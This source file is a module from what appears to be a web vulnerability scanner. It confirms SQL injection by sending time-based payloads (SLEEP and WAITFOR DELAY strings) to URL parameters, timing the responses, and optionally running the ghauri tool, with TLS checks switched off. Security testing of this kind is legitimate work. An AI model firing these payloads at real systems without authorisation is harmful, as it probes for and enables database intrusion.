const { BaseModule, ModuleResult } = require('./base');
const { runTool } = require('../runner');
const { isInstalled } = require('../registry');

class SqliConfirm extends BaseModule {
  static moduleName = 'sqli_confirm';
  static phase = 'P6b';
  static toolsNeeded = ['ghauri'];

  async execute() {
    const findings = this.workspace.readJsonl('findings.jsonl');
    const sqliTargets = findings
      .filter(f =>
        ((f.name && f.name.toLowerCase().includes('sqli')) ||
         (f.template_id && f.template_id.toLowerCase().includes('sql')))
        && f.url
      )
      .map(f => f.url);

    // Only URLs that carry a value to inject (?param=value) are testable — the
    // params.txt "url?param" form (no value) and plain pages cannot be injected.
    const candidates = [...this.workspace.readLines('urls.txt'), ...this.workspace.readLines('params.txt')]
      .filter(u => /\?[^=]*=/.test(u));
    const targetSet = new Set([...sqliTargets, ...candidates]);
    let targets = [...targetSet];

    if (targets.length === 0) {
      return new ModuleResult({ module: SqliConfirm.moduleName, status: 'skipped', errors: ['No SQL injection candidates'] });
    }

    const maxUrls = this.config.sqli_max_urls || 20;
    targets = targets.slice(0, maxUrls);

    const toolUsed = ['time-based'];
    let fallback = false;

    // Fast, deterministic time-based detection is the primary path so the scan
    // stays interactive. ghauri is thorough but can take minutes per URL, so it
    // only runs as a deep-confirm when explicitly enabled (config.sqli_deep).
    let allConfirmed = await this._timingCheck(targets);

    if (this.config.sqli_deep && isInstalled('ghauri')) {
      toolUsed.push('ghauri');
      const seeds = allConfirmed.length ? [...new Set(allConfirmed.map(c => c.url))] : targets.slice(0, 5);
      const deep = await this._runGhauri(seeds);
      for (const d of deep) if (!allConfirmed.some(c => c.url === d.url)) allConfirmed.push(d);
    } else if (!isInstalled('ghauri')) {
      fallback = true;
    }

    // One finding per endpoint+parameter.
    {
      const seen = new Set();
      allConfirmed = allConfirmed.filter(c => {
        let key; try { key = new URL(c.url).pathname + '|' + ((c.evidence && c.evidence.param) || ''); } catch { key = c.url; }
        if (seen.has(key)) return false; seen.add(key); return true;
      });
    }

    // Only reproduced (dast_confirmed) injections go to confirmed.jsonl; a
    // single-sample delay stays a 'potential' lead in findings.jsonl.
    const dast = allConfirmed.filter(c => c.type === 'dast_confirmed');
    if (dast.length) this.workspace.appendJsonl('confirmed.jsonl', dast);
    if (allConfirmed.length) this.workspace.appendJsonl('findings.jsonl', allConfirmed);

    return new ModuleResult({
      module: SqliConfirm.moduleName,
      items: allConfirmed.map(c => c.url),
      records: allConfirmed,
      toolUsed: toolUsed.join(', '),
      fallback,
    });
  }

  async _runGhauri(targets) {
    const confirmed = [];
    for (const url of targets) {
      this.emit('log', { msg: `ghauri: ${url}` });
      const result = await runTool(
        // --risk is not a ghauri flag (it's sqlmap's); --technique T focuses on
        // the time-based checks we seed it with.
        `ghauri -u "${url}" --batch --level 2 --timeout 10 --retries 1 --technique T`,
        120,
      );
      if (result.returncode === 0 && result.stdout.toLowerCase().includes('is vulnerable')) {
        let sqliType = 'unknown';
        for (const t of ['boolean-based', 'time-based', 'error-based', 'union-based', 'stacked']) {
          if (result.stdout.toLowerCase().includes(t)) {
            sqliType = t;
            break;
          }
        }
        confirmed.push({
          name: `SQLi: ${sqliType}`,
          severity: 'critical',
          url,
          evidence: {
            type: sqliType,
            tool_output: result.stdout.slice(0, 500),
          },
          type: 'dast_confirmed',
          vuln_class: 'sqli',
          module: SqliConfirm.moduleName,
        });
      }
    }
    return confirmed;
  }

  async _timingCheck(targets) {
    const findings = [];
    const ua = this.config.user_agent || 'WebKiller/2.0';
    const delayThreshold = 4.0;
    const payloads = [
      "' OR SLEEP(5)-- -",
      "1; WAITFOR DELAY '0:0:5'-- ",
      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
    ];

    const { pushInsecureTLS, popInsecureTLS } = require('../tls_guard');
    pushInsecureTLS();

    try {
      for (const url of targets) {
        let parsed;
        try {
          parsed = new URL(url);
        } catch {
          continue;
        }
        const params = parsed.searchParams;
        const paramNames = [...new Set(params.keys())];
        if (paramNames.length === 0) continue;

        for (const paramName of paramNames.slice(0, 3)) {
          let baseTime;
          try {
            const baseStart = Date.now();
            await fetch(url, {
              headers: { 'User-Agent': ua },
              signal: AbortSignal.timeout(10000),
              redirect: 'manual',
            });
            baseTime = (Date.now() - baseStart) / 1000;
          } catch {
            continue;
          }

          for (const payload of payloads) {
            try {
              const testUrl = new URL(url);
              testUrl.searchParams.set(paramName, payload);
              const start = Date.now();
              await fetch(testUrl.href, {
                headers: { 'User-Agent': ua },
                signal: AbortSignal.timeout(15000),
                redirect: 'manual',
              });
              const elapsed = (Date.now() - start) / 1000;

              if (elapsed - baseTime > delayThreshold) {
                // Re-send once; the delay must reproduce to rule out jitter/load.
                let reconfirmed = false;
                try {
                  const s2 = Date.now();
                  await fetch(testUrl.href, { headers: { 'User-Agent': ua }, signal: AbortSignal.timeout(15000), redirect: 'manual' });
                  reconfirmed = ((Date.now() - s2) / 1000) - baseTime > delayThreshold;
                } catch { reconfirmed = false; }
                findings.push({
                  name: `SQLi (time-based): ${paramName}`,
                  severity: 'high',
                  url,
                  evidence: {
                    param: paramName,
                    base_time: Math.round(baseTime * 100) / 100,
                    delay_time: Math.round(elapsed * 100) / 100,
                    reconfirmed,
                    note: reconfirmed ? 'time-based injection reproduced on re-test' : 'single-sample delay — manual confirmation advised',
                  },
                  type: reconfirmed ? 'dast_confirmed' : 'potential',
                  vuln_class: 'sqli',
                  module: SqliConfirm.moduleName,
                });
                break;
              }
            } catch {
              // request failed, skip
            }
          }
        }
      }
    } finally {
      popInsecureTLS();
    }

    return findings;
  }
}

module.exports = SqliConfirm;
